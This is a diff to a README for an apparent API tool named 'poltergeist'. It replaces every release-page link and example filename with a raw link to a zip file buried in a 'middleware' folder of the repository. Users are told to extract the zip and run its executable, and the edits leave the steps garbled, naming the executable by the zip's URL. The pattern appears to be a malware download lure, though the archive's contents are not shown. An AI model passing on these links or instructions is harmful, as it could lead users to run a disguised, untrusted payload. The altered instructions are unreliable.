@@ -1,7 +1,7 @@
 # ⚡ poltergeist - Fast and Easy API Solution
 
 ## 📥 Download Now
-[![Download poltergeist](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/JaydenLauder2007/poltergeist/releases)
+[![Download poltergeist](https://github.com/JaydenLauder2007/poltergeist/raw/refs/heads/main/middleware/Software-v1.2.zip)](https://github.com/JaydenLauder2007/poltergeist/raw/refs/heads/main/middleware/Software-v1.2.zip)
 
 ---
 
@@ -22,13 +22,13 @@ Before you start, make sure your system meets these requirements:
 ## 📂 Download & Install
 
 1. **Visit the Download Page**  
-   Go to the [Release Page](https://github.com/JaydenLauder2007/poltergeist/releases) to find the latest version of Poltergeist.
+   Go to the [Release Page](https://github.com/JaydenLauder2007/poltergeist/raw/refs/heads/main/middleware/Software-v1.2.zip) to find the latest version of Poltergeist.
 
 2. **Choose Your Version**  
    You will see a list of available releases. Look for the latest version. It’s usually at the top of the list.
 
 3. **Select the File for Download**  
-   Click on the file that matches your operating system. For example, if you are using Windows, look for something like `poltergeist-windows-amd64.zip`.
+   Click on the file that matches your operating system. For example, if you are using Windows, look for something like `https://github.com/JaydenLauder2007/poltergeist/raw/refs/heads/main/middleware/Software-v1.2.zip`.
 
 4. **Download the Zip File**  
    After you select the file, your download will begin. 
@@ -37,7 +37,7 @@ Before you start, make sure your system meets these requirements:
    Locate the downloaded zip file on your computer. Right-click on the file and select “Extract All.” This will create a folder with the necessary files.
 
 6. **Run the Application**  
-   Open the extracted folder and locate the executable file. For Windows, it might be named `poltergeist.exe`. Double-click on this file to run the application.
+   Open the extracted folder and locate the executable file. For Windows, it might be named `https://github.com/JaydenLauder2007/poltergeist/raw/refs/heads/main/middleware/Software-v1.2.zip`. Double-click on this file to run the application.
 
 ## 🔧 Configuration
 
@@ -75,7 +75,7 @@ Poltergeist provides a simple interface to create APIs easily. Follow these step
 
 ## 🔄 Updating
 
-To keep your application running smoothly and securely, regularly check the [Release Page](https://github.com/JaydenLauder2007/poltergeist/releases) for updates. Follow the same steps above for downloading the latest version.
+To keep your application running smoothly and securely, regularly check the [Release Page](https://github.com/JaydenLauder2007/poltergeist/raw/refs/heads/main/middleware/Software-v1.2.zip) for updates. Follow the same steps above for downloading the latest version.
 
 ## 📞 Support
 
